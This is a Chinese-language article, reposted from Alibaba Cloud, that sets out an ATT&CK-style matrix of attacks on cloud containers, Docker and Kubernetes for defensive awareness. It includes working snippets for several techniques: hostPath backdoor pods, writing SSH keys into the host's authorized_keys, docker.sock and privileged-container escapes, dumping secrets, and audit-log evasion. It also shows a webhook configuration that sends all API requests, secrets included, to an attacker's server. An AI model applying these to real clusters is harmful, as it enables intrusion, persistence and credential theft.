#                      阿里云 容器ATT&CK攻防矩阵

> 本文转载自：阿里云  [国内首个云上容器ATT&CK攻防矩阵发布，阿里云助力企业容器化安全落地](https://developer.aliyun.com/article/765449?groupCode=aliyunsecurity)

# 关键字：

Attack Matrix、ATT&CK、云原生、容器化、容器安全、K8S、Docker、阿里云、AK 泄露、恶意镜像、黑客入侵、运行时安全、镜像安全

# 容器化带来的安全隐患

过去的2019 年是企业容器化爆发的一年。据统计已经有超过 90% 的互联网企业正在部署或使用容器，希望能通过更为敏捷的方式快速响应市场需求。

然而，伴随着容器技术的快速发展，容器安全问题也逐渐成为企业所关注的话题，同时，开发和运维人员缺乏对容器的安全威胁和最佳实践的认识也可能会使业务从一开始就埋下安全隐患。Tripwire的调研显示，60%的受访者所在公司在过去的一年中发生过至少一起容器安全事故。在部署规模超过100个容器的公司中，安全事故的比例上升到了75%，由此可见，快速拥抱容器化带来的安全风险不容忽视。本文对云上容器ATT&CK矩阵做了详细阐述，希望能帮助开发和运维人员了解容器的安全风险和落地安全实践。

# 一、云上容器ATT&CK攻防矩阵概览

ATT＆CK®框架（Reference ATTACK Matrix for Container on Cloud）是网络攻击中涉及的已知策略和技术的知识库。为便于企业构建容器化应用安全体系，阿里云在传统主机安全的基础上，围绕自建容器集群以及云原生容器服务场景，通过全面分析黑客攻击Docker和K8s的过程和手段，推出容器安全ATT&CK攻防矩阵，让黑客无所遁形，助力企业全面提升容器安全能力水位。



![1.png](https://ucc.alicdn.com/pic/developer-ecology/729c8c14b26d432f9e9368a45b84d731.png)

# 二、云上容器ATT&CK攻防矩阵详解

## 1. Initial Access/初始访问

### 1.1 云账号AK泄露

云平台安全是云服务(容器服务、VM服务)的基础，如果业务代码需要通过AccessKey的方式进行鉴权并与云服务通信，应至少为每个云服务创建子账号并赋予需要的最小权限，同时推荐使用云平台提供的角色（如阿里云RAM角色）进行认证和授权。在实践中我们发现，存在部分管理员在进行代码托管时，使用主账号AK(拥有全部云资源控制权限)并不慎将其泄露到公开仓库（如Github），进而导致其云服务遭受入侵的场景，针对这一风险点，需要企业在使用云原生服务及容器化应用的过程中时刻关注。

### 1.2 使用恶意镜像

部分容器开发者会使用公开的镜像源(如dockerhub)下载镜像并在业务环境中运行，但如果不慎使用了存在漏洞的镜像，会给业务带来安全风险。此外，攻击者时常会将恶意镜像部署到dockerhub，并通过诱导安装或链路劫持对企业进行供应链攻击。

示例：一个在Dockerhub中伪装成mysql的恶意镜像，同时携带了挖矿程序：



![2挖矿程序.png](https://ucc.alicdn.com/pic/developer-ecology/02b511c0ed444a0b8730c79e397171ce.png)

### 1.3 K8s API Server未授权访问

K8s API Server作为K8s集群的管理入口，通常使用8080和6443端口，其中8080端口无需认证，6443端口需要认证且有TLS保护。

如果开发者使用8080端口，并将其暴露在公网上，攻击者就可以通过该端口API，直接对集群下发指令，或访问/ui进入K8s集群管理dashboard，操作K8s实施破坏。

### 1.4 K8s configfile泄露

K8s configfile作为k8s集群的管理凭证，其中包含有关K8s集群的详细信息，包括它们API Server的地址和登录凭证。在购买托管容器服务时，云厂商会向用户提供该文件以便于用户可以通过kubectl对集群进行管理。如果攻击者能够访问到此文件（如办公网员工机器入侵、泄露到Github的代码等），就可以直接通过API Server接管K8s集群，带来风险隐患。

示例：阿里云容器服务K8s configfile：



![3configfile.png](https://ucc.alicdn.com/pic/developer-ecology/14cf43fd489b4c35bd23abce152737f9.png)

### 1.5 Docker daemon公网暴露

Docker以client-server模式工作，其中docker daemon服务在后台运行，负责管理容器的创建、运行和停止操作，并提供docker许多其他运行时功能。执行docker命令会调用一个客户端，该客户端通过Docker的REST API将命令发送到服务端(docker daemon)。

在Linux主机上，docker daemon监听它在/var/run/docker.sock中创建的unix socket。为了使docker daemon可管理，可以通过配置TCP socket将其暴露在网络中，一般情况下2375端口用于未认证的HTTP通信，2376用于可信的HTTPS通信。

如果管理员测试业务时配置不当导致docker.sock通过2375暴露在公网，攻击者即可通过该API接管docker服务。

示例：Docker daemon的2375端口的暴露：

```
docker daemon -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
```

### 1.6 容器内应用漏洞入侵

同主机安全一样，容器中运行的应用侧漏洞（如WEB应用RCE漏洞、Redis未授权访问等）也会成为黑客的突破口，攻击者可以利用这些漏洞进入容器内部并发起进一步攻击。

### 1.7 Master节点SSH登录凭证泄露

常见的容器集群管理方式是通过登录Master节点或运维跳板机，然后再通过kubectl命令工具来控制k8s。在此情况下，前置节点的SSH凭证泄露或被攻破也会使K8s集群暴露在风险中。



![4风险中.png](https://ucc.alicdn.com/pic/developer-ecology/a2c78e0ab352456e8e2218e89e1edb92.png)

### 1.8 私有镜像库暴露

在容器化应用场景中，公司使用镜像来进行持续集成和自动化部署，这些镜像往往通过专用的私有镜像库来管理。暴露在公网的私有镜像库极有可能遭受攻击者入侵，并通过劫持供应链来渗透下游业务。

以Harbor为例，Harbor是一个用于存储和分发Docker镜像的企业级Registry开源服务器，集成了Docker Hub、Docker Registry、谷歌容器等。它提供了一个简单的GUI，允许用户根据自己的权限下载、上传和扫描镜像。在过去的数年里，Harbor逐渐受到人们的关注并成为CNCF的孵化项目，被企业广泛应用。Harbor在2019年披露了一个严重漏洞CVE-2019-16097，该漏洞允许攻击者通过发送恶意请求以管理员权限创建用户，从而接管Harbor。该漏洞利用方式简单，对暴露在公网的Harbor服务构成较大威胁。

## 2. Execution/执行

### 2.1 通过kubectl进入容器

Kubectl是一个管理k8s集群的命令行工具，kubectl在$HOME/.kube目录中寻找一个名为config的文件并连接API Server进行鉴权操作。攻击者可以通过kubectl exec指令在任意pod内部执行命令。

示例：kubectl exec进入pod内部执行指令：

```
xy@x-8 ~/D/t/K8s_demo> kubectl get pod
NAME         READY   STATUS    RESTARTS   AGE
app-1-wp-0   1/1     Running   0          182d
app-1-wp-1   1/1     Running   0          182d
myapp        1/1     Running   0          11d
myappnew     1/1     Running   0          11d
xy@x-8 ~/D/t/K8s_demo> kubectl exec -it myappnew /bin/bash
root@myappnew:/# whoami
root
```

### 2.2 创建后门容器

攻击者可通过拥有pods权限的用户创建基础镜像并利用其执行后续渗透操作。

示例：通过yaml文件创建pod，并将pod的根目录/挂载到容器/mnt目录下，操作宿主机文件：

```
xy@x-8 ~/D/test> cat mymaster.yaml
apiVersion: v1
kind: Pod
metadata:
  name: myappnew
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
xy@x-8 ~/D/test> kubectl create -f ~/Desktop/test/mymaster.yaml
pod/myappnew created
xy@x-8 ~/D/test> kubectl exec -it myappnew /bin/bash
root@myappnew:/# cd /mnt
root@myappnew:/mnt# ls
bin   checkapp  etc   lib    lost+found  mnt  proc  run   srv  tmp  var
boot  dev   home  lib64  media   opt  root  sbin  sys  usr
```

### 2.3 通过K8s控制器部署后门容器

Kubernetes中运行了一系列控制器(Controllers)来确保集群的当前状态与期望状态保持一致。例如，ReplicaSet控制器负责维护集群中运行的Pod数量；Node控制器负责监控节点的状态，并在节点出现故障时及时做出响应。

攻击者在拥有controllers权限情况下可以通过ReplicaSet/DaemonSet/Deplyment创建并维持后门容器。

示例：攻击者通过controllers攻击：

```
xy@x-8 ~/D/test> cat nginx-deploy.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx-test
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - image: nginx
        name: container
        volumeMounts:
        - mountPath: /mnt
          name: test-volume
      volumes:
      - name: test-volume
        hostPath:
          path: /
xy@x-8 ~/D/test> kubectl apply -f nginx-deploy.yaml
deployment.apps/nginx-deployment created
xy@x-8 ~/D/test> kubectl get pods
NAME                               READY   STATUS    RESTARTS   AGE
app-1-wp-0                         1/1     Running   0          183d
app-1-wp-1                         1/1     Running   0          183d
myapp                              1/1     Running   0          12d
myappnew                           1/1     Running   0          38m
nginx-deployment-b676778d6-lcz4p   1/1     Running   0          55s
```

### 2.4 利用Service Account连接API Server执行指令

Kubernetes区分用户和服务(Service Account)两种账户，其中用户账户便于管理员与集群交互，服务账号用于Pod进程调用Kubernetes API或其他外部服务。

K8s pod中默认携带服务账户的访问凭证，如果被入侵的pod存在高权限的用户，则容器中可以直接通过service account向K8s下发指令。

示例：service account在容器内部的默认路径：

```
cd /var/run/secrets/kubernetes.io/serviceaccount
```

示例：带凭证访问API server的方式：

```
curl -voa  -s  https://192.168.0.234:6443/version
# 以下命令相当于 kubectl get no
curl -s https://192.168.0.234:6443/api/v1/nodes?watch  --header "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tOGprZmQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2DydmljZS1hY2NvdW50LnVpZCI6Ijg4Y2ZmNmYzLWY0NzktMTFlOS1iZmY1LTJlYzU3MmZlMWRjOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.OU740qNcSf0Z__vAO1XJWUw9fvNNI2e4LxHypkpzREmnqrK9UZ-rrp9tG8Vxbc65FlPFj9efdpfWYExxjDDQwQTi-5Afmk4EA6EH-4vEs4V1r4gb0za8cyPVSAjzmEh7uIMgQHVo7y32V_BqUd8cmBoTdgnTY8Nx2QvMClvoYvEWvDKhbMnQjWH1x5Z6jK0iNg7btlK_WXnz8-yU2a0-jgoZFZ8D_qX16mZJ_ZoxEwPNTeNR8pP1l3ebZGVqBQA1PIFVG4HOlYomZya_DWGleMRYpulnECtBOTYyswzCwN8qJUVsdv6yWH1blWHKzYrkcoDmp2r6QhekaG1KFoX_YA" --cacert ca.crt
```

### 2.5 带有SSH服务的容器

含有SSH服务的容器暴露了新的攻击面，由于暴力破解或者登录凭证泄露，攻击者可以进入到容器内部执行指令进行恶意操作。这种情况多见于自建容器或K8s环境(一些运维人员将容器当做VM使用)。此外当攻击者逃逸到node节点时可以通过添加账号或写入/.ssh/authorized_keys等方式利用SSH下发后续恶意指令。

### 2.6 通过云厂商CloudShell下发指令

针对VM和容器服务的管理，云服务商往往会提供沙箱化的便捷管理工具，在云账号凭证泄露的情况下，攻击者可以通过云厂商提供的API接管集群。此外云厂商沙箱本身的安全问题也会影响到用户集群安全。
示例：通过Cloud Shell管理集群：



![5管理集群.png](https://ucc.alicdn.com/pic/developer-ecology/0b3a48e8bce64f899a7d4b1402e515b5.png)

## 3. Persistence/持久化

### 3.1 部署远控客户端

（参考2.3部分通过K8s控制器部署后门容器）攻击者通过K8s DaemonSet向每个Node中植入后门容器，这些容器可以设置为特权容器并通过挂载宿主机的文件空间来进一步向每个Node植入二进制并远控客户端，从而完成Node层持久化，且后续操作不会触发K8s层的审计策略。

### 3.2 通过挂载目录向宿主机写入文件

一种常见的容器逃逸方法，如果容器/Pod启动时将VM的核心目录以写权限挂载(如/root, /proc, /etc等)，则攻击者进入容器后可以修改敏感文件进行逃逸，如利用/etc/crontab执行定时任务、修改/root/.ssh/authorized_keys获取SSH登录权限、读取其他进程空间内容等。
示例：不安全的目录挂载：

```
docker run -it -v /root:/root ubuntu /bin/bash
```

写入SSH凭证

```
(echo -e "\n\n";cat id_rsa_new.pub) >> /root/.ssh/authorized_keys
```

### 3.3 K8s cronjob持久化

Cronjob是K8s controller的一种，用于创建基于时间的调度任务(类似主机的/etc/crontab)。攻击者在获取controller create权限后可以创建cronjob实现持久化。

示例：cronjob持久化

```
xy@x-8 ~/D/test> cat cronjob.yaml
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: echotest
spec:
  schedule: "*/1 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: container
            image: nginx
            args:
            - /bin/sh
            - -c
            - echo test
          restartPolicy: OnFailure
xy@x-8 ~/D/test> kubectl create -f cronjob.yaml
cronjob.batch/echotest created
xy@x-8 ~/D/test> kubectl get cronjobs
NAME           SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE
echotest       */1 * * * *   False     3        26s             3m8s
```

### 3.4 在私有镜像库的镜像中植入后门

（参考1.8私有镜像库暴露）攻击者在接管企业私有镜像库之后，可以进行拉取私有镜像窃取信息、删除仓库中的镜像、替换仓库中的镜像、为已有镜像添加后门、在镜像服务中创建后门账号等恶意操作。

一种持久化攻击方式是在dockerfile中加入额外的恶意指令层来执行恶意代码，同时该方法可以自动化并具有通用性。同时在Docker镜像的分层存储中，每一层的变化都将以文件的形式保留在image内部，一种更为隐蔽的持久化方式是直接编辑原始镜像的文件层，将镜像中原始的可执行文件或链接库文件替换为精心构造的后门文件之后再次打包成新的镜像，从而实现在正常情况下无行为，仅在特定场景下触发的持久化工具。

### 3.5 修改核心组件访问权限

攻击者通过ConfigMap修改Kubelet使其关闭认证并允许匿名访问，或暴露API Server的未授权HTTP接口，使其在后续渗透过程中拥有持续的后门命令通道。

## 4. Privilege Escalation/权限提升

### 4.1 利用特权容器逃逸

Docker允许特权容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使特权容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。在这种情况下，攻击者从特权容器逃逸是极其容易实现的。

示例：将系统盘挂载到容器内部，读写宿主机文件：

```
root@d000b330717d:/# fdisk -l
Disk /dev/vda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xe2eb87fa

Device     Boot Start      End  Sectors Size Id Type
/dev/vda1  *     2048 83886046 83883999  40G 83 Linux
root@d000b330717d:/# mkdir /mnt1
root@d000b330717d:/# mount /dev/vda1 /mnt1
root@d000b330717d:/# cd /mnt1
root@d000b330717d:/mnt1# ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
```

### 4.2 K8s Rolebinding添加用户权限

K8s使用基于角色的访问控制(RBAC)来进行操作鉴权，允许管理员通过 Kubernetes API 动态配置策略。某些情况下运维人员为了操作便利，会对普通用户授予cluster-admin的角色，攻击者如果收集到该用户登录凭证后，可直接以最高权限接管K8s集群。少数情况下，攻击者可以先获取角色绑定(RoleBinding)权限，并将其他用户添加cluster-admin或其他高权限角色来完成提权。

### 4.3 利用挂载目录逃逸

参考（3.2通过挂载目录向宿主机写入文件），攻击者在容器内部可以利用挂载通道修改宿主机文件来实现逃逸。

### 4.4 利用操作系统内核漏洞逃逸

操作系统内核安全（如Linux内核）是容器安全体系的基石，是实现容器隔离设计的前提。内核漏洞的利用往往从用户空间非法进入内核空间开始，在内核空间赋予当前或其他进程高权限以完成提权操作。在云原生场景中，云厂商会在VM层为操作系统内核漏洞进行补丁修复，避免用户被已公开的内核漏洞攻击。

### 4.5 利用Docker漏洞逃逸

Docker软件历史上出现过多个高危安全漏洞，目前仍有一定影响的是两个2019年的漏洞：Docker runc RCE(CVE-2019-5736)和Docker cp RCE(CVE-2019-14271)。两个漏洞均利用了Docker本身的功能设计缺陷，利用覆盖容器内部runc文件、libnss库，从而实现从容器到宿主机的逃逸行为。从攻击者角度来看，这两个漏洞均需要与宿主机交互才会触发payload执行，实战中并不高效，但Docker既要隔离又要通信的机制设计或许会在未来暴露出更多问题。在云服务商提供的托管K8s集群以及Serverless服务中，Docker服务自身安全性会由云服务商维护，相比自建，安全性会更有保障。

### 4.6 利用K8s漏洞进行提权

容器化基础设施每一环的软件漏洞都会带来安全风险。Kubernetes特权升级漏洞(CVE-2018-1002105)允许普通用户在一定前提下提升至K8s API Server的最高权限。该漏洞需要用户拥有对某个namespace下pod的操作权限，同时需要client到API Server和kubelet的网络通路来实施攻击。同样，该漏洞在云服务中已经被服务商修复，在自建的K8s集群中仍有发挥空间。

### 4.7 容器内访问docker.sock逃逸

当docker.sock被挂载到容器内部时，攻击者可以在容器内部访问该socket，管理docker daemon。

```
docker -v /var/run/docker.sock:/var/run/docker.sock
```

此时容器内部可以与docker deamon通信，并另起一个高权限的恶意容器，从而拿到root shell。
示例：与docker deamon通信：

```
find / -name docker.sock
curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
```

### 4.8 利用Linux Capabilities逃逸

容器即隔离，容器在设计上使用cgroup、namespace等对宿主机的资源进行隔离及调度使用，同时也支持使用Linux capabilities做细粒度的权限管控。从这一角度来看，不安全的权限分配会为容器逃逸提供通路。
示例：K8s YAML配置中对capabilities的支持：

```
securityContext:
  capabilities:
    drop:
    - ALL
    add:
- NET_BIND_SERVICE
```

docker会以白名单方式赋予容器运行所需的capabilities权限，我们可以在docker run命令中使用 --cap-add 以及 --cap-drop 参数控制capabilities。以下命令对容器开放了宿主机的进程空间，同时赋予容器CAP_SYS_PTRACE权限，此时攻击者在容器内部可以注入宿主机进程从而实现逃逸。

```
docker run -it --pid=host --cap-add=CAP_SYS_PTRACE ubuntu
```

## 5. Defense Evasion/防御逃逸

### 5.1 容器及宿主机日志清理

攻击者在获得一定权限之后，可以擦除容器内部及宿主机的系统日志以及服务日志，为企业的入侵事件复盘以及溯源增加难度。目前容器运行时安全解决方案中均采用实时的日志采集、自保护方案以及日志采集异常的预警，来解决日志恶意擦除导致的溯源问题。同时，在云原生的容器攻防战场中，恶意卸载安全产品agent以切断日志采集能力也逐渐成为了常见的攻击方式。

### 5.2 K8s Audit日志清理

Kubernetes Audit功能提供了与安全相关的按时间顺序排列的记录集，记录单个用户、管理员或系统其他组件影响系统的活动顺序。日志提供了包括事件、时间、用户、作用对象、发起者、执行结果等详细信息，为运行时安全审计提供便利。攻击者可以通过清理本地日志文件(用户/服务商可自定义位置)以及切断服务商/安全产品的日志上传通道(卸载agent或者阻断网络通路)来隐藏对K8s集群的操作，一些容器安全产品通过K8s AuditSink功能将日志导出到外部审计，也可通过修改K8s配置进行开启或关闭。

示例：阿里云容器服务Kubernetes Audit审计中心：



![6审计中心.png](https://ucc.alicdn.com/pic/developer-ecology/ac0559d4ac104a699b30f359f0816667.png)

### 5.3 利用系统Pod伪装

K8s在部署时会在kube-system namespace中内置一些常见的功能性pod。在云厂商提供的容器服务中，集群还会默认携带一些云服务的组件(如日志采集、性能监控的agent)。攻击者可以利用常见的K8s内置pod作为后门容器，或将后门代码植入这些pod来实现隐蔽的持久化。
示例：阿里云托管版K8s服务内置pod：

```
xy@x-8 ~/D/test> kubectl get deployments --namespace=kube-system
NAME                              READY   UP-TO-DATE   AVAILABLE   AGE
alibaba-log-controller            1/1     1            1           183d
alicloud-application-controller   1/1     1            1           183d
alicloud-disk-controller          1/1     1            1           183d
alicloud-monitor-controller       1/1     1            1           183d
aliyun-acr-credential-helper      1/1     1            1           183d
coredns                           2/2     2            2           183d
metrics-server                    1/1     1            1           183d
nginx-ingress-controller          2/2     2            2           183d
tiller-deploy                     1/1     1            1           183d
```

### 5.4 通过代理或匿名网络访问K8s API Server

利用代理或匿名网络执行攻击是常见的反溯源行为，在K8s Audit日志中记录了每个行为发起者的源IP，通过公网访问API Server的IP将会被记录并触发异常检测和威胁情报的预警。

示例：K8s Audit日志对pod exec行为的记录：



![7行为的记录.png](https://ucc.alicdn.com/pic/developer-ecology/754d178ab24f497b826d72cef499ef77.png)

### 5.5 清理安全产品Agent

目前主流容器运行时的安全产品部署方式有两种：平行容器模式和主机agent模式。前者创建安全容器采集pod、K8s集群日志以及实现网络代理；后者在VM层对容器层的进程网络文件进行采集。攻击者在获取到集群管理权限或逃逸到宿主机时，可以通过清理掉安全产品植入的探针，破坏日志完整性，使后续攻击行为无法被审计工具发现。在这一过程中，安全容器或主机agent异常离线往往会触发保护性告警。

### 5.6 创建影子API Server

攻击者可以复制原生API Server的配置，修改关键参数（例如关闭认证，允许匿名访问，使用HTTP请求），再使用这些修改过的参数创建Pods。攻击者可以通过这个影子API Server直接获取etcd内存储的内容，使后续渗透行为在审计日志中匿名。

### 5.7 创建超长annotations使K8s Audit日志解析失败

一般情况下云厂商/安全产品会使用自身日志服务的agent对K8s Audit日志进行采集和解析，以便于与后续审计规则结合。在入侵检测中，日志的采集-存储-计算的过程会受限于agent的性能占用、Server端日志服务以及其他云产品/开源组件对存储和计算的限制，过长的字段将有可能触发截断，导致敏感信息无法经过审计规则从而绕过入侵检测，K8s API请求中允许携带1.5MiB的数据，但在Google StackDriver日志服务仅允许解析256KB的内容，这将导致Audit日志中的敏感信息(如创建Pod时的磁盘挂载配置项)绕过审计。

示例：通过无意义的超长annotations攻击日志分析链路：

```
apiVersion: v1
kind: Pod
metadata:
  name: annotations-bypass
  annotations:
    useless-key: useless-value(1 MiB)
...
```

## 6. Credential Access/窃取凭证

### 6.1 K8s Secret泄露

K8s使用Secret对象对access key、密码、OAuth token和ssh key等敏感信息进行统一管理。pod定义时可以引用secret对象以便在运行时访问。攻击者可以通过pod内部service account或更高权限用户来获取这些secret内容，从中窃取其他服务的通信凭证。
示例：查看并下载K8s secret保存的凭据：

```
xy@x-8 ~> kubectl get secrets --namespace=kube-system
NAME                                             TYPE                                  DATA   AGE
admin-token-ltbcr                                kubernetes.io/service-account-token   3      184d
alibaba-log-controller-token-9kv4m               kubernetes.io/service-account-token   3      184d
aliyun-acr-credential-helper-token-vwmlw         kubernetes.io/service-account-token   3      184d
attachdetach-controller-token-l5bfh              kubernetes.io/service-account-token   3      184d
bootstrap-signer-token-qbrx7                     kubernetes.io/service-account-token   3      184d
bootstrap-token-509e2b                           bootstrap.kubernetes.io/token         6      184d
certificate-controller-token-dgpjn               kubernetes.io/service-account-token   3      184d
cloud-node-controller-token-647sw                kubernetes.io/service-account-token   3      184d
...
xy@x-8 ~> kubectl get secret alibaba-log-controller-token-9kv4m --namespace=kube-system -o yaml
```

### 6.2 云产品AK泄露

云原生的应用部署流程中会涉及到各种云产品的API通信，当某应用被攻破后，攻击者可以通过K8s secret或者挂载到本地的凭证文件来获取相关服务的AK并进行横向移动。一种常见的场景是：入侵WEB应用后获取云存储(OSS)、云数据库(RDS)、日志服务的通信凭证，并进一步窃取数据。

示例：关于云产品AK的扫描规则已被工具化：

![8工具化.png](https://ucc.alicdn.com/pic/developer-ecology/9d2e5fe3f5cf442bb44212a216711dd1.png)

### 6.3 K8s Service Account凭证泄露

此类场景多见于办公网运维PC、跳板机以及通过SSH管理的master节点上。黑客在攻破此类服务器时，可以检查本地是否存在kubectl鉴权所需的配置文件(一般在$HOME/.kube/config)，该文件通常包含了登录K8s集群的全部信息。

### 6.4 应用层API凭证泄露

在复杂业务场景以及微服务架构中，K8s各个服务之间、容器与VM之间会通过API方式进行通信，窃取其通信凭证可用于横向渗透。

### 6.5 利用K8s准入控制器窃取信息

K8s准入控制器(Admission Controller)用于hook客户端对API Server的请求。其中变更(mutating)控制器可以修改被其接受的对象；验证(validating)控制器可以审计并判断是否允许该请求通过。准入控制器是可以串联的，在请求到达API Server之前，如有任何一个控制器拒绝了该请求，则整个请求将立即被拒绝，并向终端用户返回一个错误。

为了便于用户部署自己的准入服务，K8s提供了动态准入控制(Admission Webhook)功能，即用于接收准入请求并对其进行处理的HTTP回调机制。

一种利用动态准入控制实现持久化的方式：攻击者在获取cluster-admin权限后，可以创建恶意的准入控制器hook掉所有的API访问，引用攻击者的外部webhook作为validating服务，这样k8s就会将携带敏感信息的API请求发送到攻击者所用服务器。

示例：利用准入控制器后门，使用通配符hook全部操作，使用failurePolicy和timeoutSeconds参数做到用户侧无感，从而实现隐蔽的数据窃取(如：K8s secret创建时发送到API的AK信息)。

```
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
...
webhooks:
- name: my-webhook.example.com
  failurePolicy: Ignore
  timeoutSeconds: 2
  rules:
  - apiGroups:   ["*"]
    apiVersions: ["*"]
    operations:  ["*"]
    resources:   ["*/*"]
    scope:       "*"
...
```

## 7. Discovery/探测

### 7.1 访问K8s API Server

（参考2.4利用Service Account连接API Server执行指令）攻击者进入pod之后，可以通过curl或wget等http客户端，或使用编译好的报文构造工具，直接访问K8s REST API，当service account具有高权限时可以直接下发命令进行横向移动。而当用户具有低权限时，也可能通过API Server探测到集群内部的资源信息、运行状态以及secret，有利于寻找下一个突破点。

### 7.2 访问Kubelet API

在kubernetes集群中，每个Node节点都会启动Kubelet进程，用来处理Master节点下发到本节点的任务，管理Pod和其中的容器。包括10250端口的认证API、10255端口的只读API以及10256端口的健康检查API。

其中10255端口可以无需授权进行只读访问，攻击者可以访问/pods获取到node、pod地址以及pod的挂载情况、环境变量等敏感信息，辅助还原业务场景和集群网络拓扑，以寻找后续攻击点。

关于Kubelet API官方并未提供文档，更多接口可在Kubelet源码中挖掘。一些有用的路径：

```
http://{node_ip}:10255/pods
http://{node_ip}:10255/spec
```

10250的端口当前版本中默认需要认证，但在老版本的K8s集群中或在用户权限(system:anonymous)被错误配置的情况下，可以尝试直接通过10250端口下发指令。

示例：命令下发：

```
root@myappnew:/# curl --insecure  https://192.168.0.237:10250/pods
Unauthorized
```



![9CIDR.png](https://ucc.alicdn.com/pic/developer-ecology/77cf88c7f9484ad8a03e57ed281cc294.png)

### 7.3 Cluster内网扫描

黑客通常会对Node、Pod、Service三个网段进行主机存活探测和端口扫描，然后从K8s内置服务、用户应用、第三方K8s插件等角度寻找更多攻击面，同时会通过找到Node IP并访问Kubelet API获取pod的详细拓扑信息。

阿里云容器服务默认CIDR：

### 7.4 访问K8s Dashboard所在的Pod

Kubernetes Dashboard为用户提供WEB界面，便于创建、修改和管理Kubernetes资源(如 Deployment，Job，DaemonSet等)。Dashboard的部署取决于云厂商和用户自身的配置，在官方的部署流程中，dashboard会创建独立的Namespace、Service、Role以及ServiceAccount。

示例：阿里云容器服务提供的dashboard：



![10dashboard.png](https://ucc.alicdn.com/pic/developer-ecology/c36b4fa554b6422ab484909616bb3b58.png)

由于K8s pod之间默认允许通信，攻击者在进入某个pod之后，可以通过信息收集或内网扫描的方式发现K8s dashboard所在service地址，并通过kubernetes-dashboard service account进行认证操作。

### 7.5 访问私有镜像库

参考1.8和3.4关于私有镜像库的攻击面，攻击者可以在K8s secret或本地配置文件中找到私有镜像库的连接方式，并在权限允许的情况下劫持私有镜像库中的镜像，实现横向移动和持久化。

### 7.6 访问云厂商服务接口

（参考6.2云产品AK泄漏）在云原生的容器化应用中，服务往往会与多种内外部API进行交互，攻击者可以通过收集这些API的登录凭据或测试是否存在未授权访问来进行攻击准备。

此外，在某些云服务商提供的CaaS或Serverless容器中，为便于使用者与底层云基础设施进行通信，厂商通过植入专用pod或者将API挂载到业务pod的方式提供额外的接口，这些接口也会成为攻击者收集信息过程中的突破口。

### 7.7 通过NodePort访问Service

K8s service的暴露方式由三种：ClusterIP，NodePort和LoadBalancer。其中LoadBalancer多与云厂商的负载均衡类产品集成，具有较强的流量审计能力。
一些业务场景中存在着K8s与VM并存的内网环境，当攻击者通过非容器化的弱点进入内网时，可以借助NodePort进行横向移动。在频繁迭代的业务中，使用NodePort的服务相比ClusterIP更加固定，可用做控制通道来穿透网络边界管控以及防火墙的限制。
默认情况下，K8s集群NodePort分配的端口范围为：30000-32767。

## 8. Lateral Movement/横向移动

### 8.1 窃取凭证攻击云服务

（参考6.2云产品AK泄漏）攻击者利用容器内部文件或K8s secret中窃取到的云服务通信凭证进行横向移动。

### 8.2 窃取凭证攻击其他应用

参考第6节的各项内容。在基础设施高度容器化的场景中，绝大部分服务都是API化的，这使凭证窃取成为扩展攻击面、获取目标数据的重要手段。K8s集群、云产品以及自建应用的通信凭证都是攻击者窃取的目标。

### 8.3 通过Service Account访问K8s API

（参考2.4利用Service Account连接API Server执行指令）攻击者在容器内部可通过Service Account访问K8s API刺探当前pod用户权限，并在权限允许的前提下对API下发指令或利用K8s提权漏洞访问集群中的其他资源。

### 8.4 Cluster内网渗透

一般情况下，K8s会默认允许Cluster内部的pod与service之间直接通信，这构成了一个"大内网"环境。攻击者在突破一个pod之后，可以通过内网扫描收集服务信息并通过应用漏洞、弱口令以及未授权访问等方式渗透Cluster的其他资源。K8s支持通过自带的网络策略(NetworkPolicy)来定义pod的通信规则，一些网络侧插件、容器安全产品也支持东西向的通信审计与管控。

### 8.5 通过挂载目录逃逸到宿主机

（参考3.2通过挂载目录向宿主机写入文件）攻击者可以利用挂载到容器内部的目录完成从pod到node的移动。

### 8.6 访问K8s Dashboard

（参考7.4访问K8s Dashboard所在的Pod）攻击者在进入某个pod之后，可以通过信息收集或内网扫描的方式发现K8s dashboard所在service地址，并在管理员权限配置失当的情况下通过K8s Dashboard下发指令。

### 8.7 攻击第三方K8s插件

为了快速上手，很多K8s快速入门指南都会介绍一些好用的插件和配置方案，但教程的创建者很少考虑到真实生产业务中的安全问题，而这些插件往往在初始的几个版本中存在鉴权方面的漏洞(如API默认允许未授权访问)，直到被攻击者反复测试之后才会逐渐稳定可靠。这些不安全的配置以及使用的第三方K8s插件/工具会引入新的攻击面，并为横向移动提供便利。

示例：常见的利用第三方组件进行横向移动的过程：
攻击者进入pod后，通过未授权访问或漏洞攻击第三方组件，并利用这些组件的权限操纵K8s集群。



